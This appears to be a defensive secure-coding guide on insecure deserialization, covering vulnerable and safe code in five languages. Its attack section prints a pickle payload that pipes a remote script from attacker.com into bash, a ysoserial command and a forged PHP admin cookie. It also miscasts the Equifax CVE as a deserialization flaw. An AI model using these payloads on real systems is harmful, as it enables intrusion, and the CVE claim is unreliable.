# Insecure Deserialization Prevention

**OWASP Top 10 2021: A08 - Software and Data Integrity Failures**  
**CWE-502: Deserialization of Untrusted Data**

## The Problem

Insecure deserialization occurs when an application deserializes (reconstructs objects from serialized data) untrusted input without proper validation, allowing attackers to execute arbitrary code, manipulate application logic, or escalate privileges.

**Attack Scenario:**

```python
# Vulnerable Python code using pickle
import pickle

def load_user_session(session_data):
    return pickle.loads(session_data)  # DANGER: Deserializes untrusted data

# Attacker sends malicious serialized object
# When deserialized, executes: os.system('rm -rf /')
```

## Why Critical

- **Remote Code Execution (RCE)**: Execute arbitrary commands on the server
- **Privilege Escalation**: Modify object properties to gain admin rights
- **Denial of Service**: Consume excessive resources
- **Data Tampering**: Alter application state or business logic

**CVSS Score**: 9.8 (CRITICAL)

---

## Attack Vectors

### 1. Python pickle RCE

```python
# Attacker crafts malicious pickle payload
import pickle
import os

class RCE:
    def __reduce__(self):
        # Executes when unpickled
        return (os.system, ('curl http://attacker.com/shell.sh | bash',))

malicious_data = pickle.dumps(RCE())

# Victim application
pickle.loads(malicious_data)  # Executes attacker's code
```

### 2. Java Deserialization RCE

```java
// Vulnerable Java code
ObjectInputStream ois = new ObjectInputStream(userInputStream);
Object obj = ois.readObject();  // Deserializes untrusted data

// Attacker uses ysoserial to craft payload
// java -jar ysoserial.jar CommonsCollections5 "calc.exe" > payload.ser
```

###3. PHP Object Injection

```php
// Vulnerable PHP code
$user_data = unserialize($_COOKIE['user']);  // DANGER

// Attacker crafts malicious cookie
// O:4:"User":2:{s:8:"isAdmin";b:1;s:7:"balance";i:1000000;}
```

### 4. .NET Deserialization

```csharp
// Vulnerable C# code
BinaryFormatter formatter = new BinaryFormatter();
object obj = formatter.Deserialize(stream);  // DANGER

// Attacker exploits via TypeConfuseDelegate
```

---

## Prevention Strategies (Defense in Depth)

### Strategy 1: Avoid Deserialization of Untrusted Data (PREFERRED)

**Use safe data formats instead:**

```python
# [REJECTED] VULNERABLE - pickle deserialization
import pickle
session_data = pickle.loads(cookie_value)

# [APPROVED] SAFE - Use JSON
import json
session_data = json.loads(cookie_value)
# JSON only represents data, cannot execute code
```

```javascript
// [REJECTED] VULNERABLE - eval or new Function
const userData = eval('(' + untrustedInput + ')');

// [APPROVED] SAFE - Use JSON.parse
const userData = JSON.parse(untrustedInput);
```

---

### Strategy 2: Use Safe Serialization Formats

**Prefer data-only formats:**

```python
# [APPROVED] JSON (data only, no code)
import json
data = json.dumps({'user': 'alice', 'role': 'admin'})
loaded = json.loads(data)

# [APPROVED] MessagePack (binary JSON)
import msgpack
data = msgpack.packb({'user': 'alice'})
loaded = msgpack.unpackb(data)

# [REJECTED] pickle (can execute code)
import pickle  # NEVER use for untrusted data
data = pickle.dumps(obj)
```

```java
// [APPROVED] JSON with Jackson
ObjectMapper mapper = new ObjectMapper();
String json = mapper.writeValueAsString(user);
User user = mapper.readValue(json, User.class);

// [REJECTED] Java Serialization
ObjectOutputStream oos = new ObjectOutputStream();  // Vulnerable
```

```php
// [APPROVED] JSON
$json = json_encode($data);
$data = json_decode($json, true);

// [REJECTED] serialize/unserialize
$data = unserialize($input);  // NEVER use with untrusted input
```

---

### Strategy 3: Digital Signatures for Serialized Data

**If serialization necessary, sign the data:**

```python
# [APPROVED] Signed serialization
import hmac
import hashlib
import json

SECRET_KEY = os.environ['SECRET_KEY']

def serialize_signed(data):
    json_data = json.dumps(data)
    signature = hmac.new(
        SECRET_KEY.encode(),
        json_data.encode(),
        hashlib.sha256
    ).hexdigest()
    
    return f"{signature}.{json_data}"

def deserialize_signed(signed_data):
    try:
        signature, json_data = signed_data.split('.', 1)
    except ValueError:
        raise ValueError('Invalid signed data')
    
    # Verify signature
    expected_sig = hmac.new(
        SECRET_KEY.encode(),
        json_data.encode(),
        hashlib.sha256
    ).hexdigest()
    
    if not hmac.compare_digest(signature, expected_sig):
        raise ValueError('Invalid signature')
    
    return json.loads(json_data)
```

```javascript
// [APPROVED] Node.js with crypto
const crypto = require('crypto');

function serializeSigned(data) {
  const jsonData = JSON.stringify(data);
  const signature = crypto
    .createHmac('sha256', process.env.SECRET_KEY)
    .update(jsonData)
    .digest('hex');
  
  return `${signature}.${jsonData}`;
}

function deserializeSigned(signedData) {
  const [signature, jsonData] = signedData.split('.');
  
  const expectedSig = crypto
    .createHmac('sha256', process.env.SECRET_KEY)
    .update(jsonData)
    .digest('hex');
  
  if (!crypto.timingSafeEqual(Buffer.from(signature), Buffer.from(expectedSig))) {
    throw new Error('Invalid signature');
  }
  
  return JSON.parse(jsonData);
}
```

---

### Strategy 4: Class Allowlisting

**If deserialization unavoidable, allowlist permitted classes:**

```python
# [APPROVED] Restricted unpickler
import pickle
import io

class RestrictedUnpickler(pickle.Unpickler):
    ALLOWED_CLASSES = {
        ('builtins', 'dict'),
        ('builtins', 'list'),
        ('builtins', 'str'),
        ('builtins', 'int'),
        ('builtins', 'float'),
        ('my_app.models', 'User'),
        ('my_app.models', 'Product'),
    }
    
    def find_class(self, module, name):
        if (module, name) not in self.ALLOWED_CLASSES:
            raise pickle.UnpicklingError(f'Class {module}.{name} not allowed')
        return super().find_class(module, name)

def safe_unpickle(data):
    return RestrictedUnpickler(io.BytesIO(data)).load()
```

```java
// [APPROVED] Java with ObjectInputFilter (Java 9+)
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.models.User;" +
    "com.myapp.models.Product;" +
    "!*"  // Reject all other classes
);

ObjectInputStream ois = new ObjectInputStream(inputStream);
ois.setObjectInputFilter(filter);
Object obj = ois.readObject();
```

---

### Strategy 5: Sandboxing and Isolation

**Isolate deserialization in restricted environment:**

```python
# [APPROVED] Deserialize in isolated process
import subprocess
import json

def deserialize_isolated(data):
    # Run deserialization in separate process with timeout
    proc = subprocess.Popen(
        ['python', 'deserialize_worker.py'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
    stdout, stderr = proc.communicate(input=data, timeout=5)
    
    if proc.returncode != 0:
        raise ValueError('Deserialization failed')
    
    return json.loads(stdout)
```

---

## Language-Specific Guidance

### Python

```python
# [REJECTED] NEVER use pickle for untrusted data
import pickle
data = pickle.loads(untrusted_input)  # CRITICAL VULNERABILITY

# [REJECTED] NEVER use yaml.load
import yaml
data = yaml.load(untrusted_input)  # Can execute code

# [APPROVED] Use yaml.safe_load
import yaml
data = yaml.safe_load(untrusted_input)  # Safe

# [APPROVED] Best: Use JSON
import json
data = json.loads(untrusted_input)
```

### Java

```java
// [REJECTED] NEVER use default ObjectInputStream
ObjectInputStream ois = new ObjectInputStream(untrustedStream);
Object obj = ois.readObject();  // CRITICAL VULNERABILITY

// [APPROVED] Use ObjectInputFilter (Java 9+)
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter("...");
ois.setObjectInputFilter(filter);

// [APPROVED] Best: Use JSON with Jackson
ObjectMapper mapper = new ObjectMapper();
MyClass obj = mapper.readValue(jsonString, MyClass.class);
```

### PHP

```php
// [REJECTED] NEVER use unserialize on untrusted input
$data = unserialize($_POST['data']);  // CRITICAL VULNERABILITY

// [APPROVED] Use JSON
$data = json_decode($_POST['data'], true);

// [APPROVED] If unserialize needed, use allowed_classes (PHP 7+)
$data = unserialize($input, ['allowed_classes' => ['User', 'Product']]);
```

### .NET/C#

```csharp
// [REJECTED] NEVER use BinaryFormatter
BinaryFormatter formatter = new BinaryFormatter();
object obj = formatter.Deserialize(stream);  // CRITICAL VULNERABILITY

// [APPROVED] Use JSON.NET
var obj = JsonConvert.DeserializeObject<MyClass>(jsonString);

// [APPROVED] Or System.Text.Json
var obj = JsonSerializer.Deserialize<MyClass>(jsonString);
```

### Ruby

```ruby
# [REJECTED] NEVER use Marshal.load on untrusted input
data = Marshal.load(untrusted_input)  // CRITICAL VULNERABILITY

# [APPROVED] Use JSON
data = JSON.parse(untrusted_input)

# [APPROVED] Or MessagePack
data = MessagePack.unpack(untrusted_input)
```

---

## Session Management Without Deserialization

**Store session ID only, data on server:**

```javascript
// [REJECTED] VULNERABLE - Serialize entire session in cookie
const sessionData = { userId: 123, isAdmin: true, balance: 1000 };
res.cookie('session', serialize(sessionData));  // Attacker can modify

// [APPROVED] SAFE - Session ID in cookie, data on server
const sessionId = crypto.randomBytes(32).toString('hex');
await redis.set(`session:${sessionId}`, JSON.stringify(sessionData));
res.cookie('sessionId', sessionId, { httpOnly: true, secure: true });
```

---

## Testing for Deserialization Vulnerabilities

**Security test cases:**

```python
def test_pickle_deserialization_rejected():
    """Test that pickle deserialization is not used"""
    import pickle
    
    # Craft malicious pickle payload
    class RCE:
        def __reduce__(self):
            import os
            return (os.system, ('echo VULNERABLE',))
    
    malicious_data = pickle.dumps(RCE())
    
    # Attempt to send to application
    response = client.post('/api/session', data=malicious_data)
    
    # Should reject or not execute code
    assert response.status_code in [400, 415]  # Bad Request or Unsupported Media Type

def test_object_tampering():
    """Test that object properties cannot be tampered"""
    # Create legitimate session
    response = client.post('/api/login', json={'username': 'user', 'password': 'pass'})
    session_token = response.cookies.get('session')
    
    # Attempt to modify serialized session to add isAdmin=true
    # (This test depends on serialization format)
    tampered_token = tamper_session(session_token, {'isAdmin': True})
    
    # Attempt to use tampered session
    response = client.get('/api/admin', cookies={'session': tampered_token})
    
    # Should reject tampered session
    assert response.status_code == 403  # Forbidden
```

---

## Verification Checklist

- [ ] NO deserialization of untrusted data
- [ ] Using safe formats (JSON, MessagePack) instead of language-specific serialization
- [ ] If deserialization required, data is digitally signed
- [ ] Class allowlisting implemented for deserialization
- [ ] Session data stored server-side, not in cookies
- [ ] Dangerous functions banned (pickle.loads, unserialize, ObjectInputStream)
- [ ] Input validation before deserialization
- [ ] Automated tests for deserialization attacks
- [ ] Code review checks for deserialization
- [ ] Dependency scanning for vulnerable libraries (e.g., Apache Commons Collections)

---

## Real-World Examples

- **Equifax (2017)**: Apache Struts deserialization vulnerability (CVE-2017-5638) led to breach of 147 million records
- **Apache Commons Collections**: Java gadget chains enabled RCE via deserialization
- **Jenkins**: Multiple deserialization vulnerabilities allowing RCE

---

## References

- OWASP Top 10 2021: A08 - Software and Data Integrity Failures
- CWE-502: Deserialization of Untrusted Data
- OWASP Deserialization Cheat Sheet
- NIST SP 800-53: SI-10 (Information Input Validation)
- ysoserial: Java deserialization payload generator
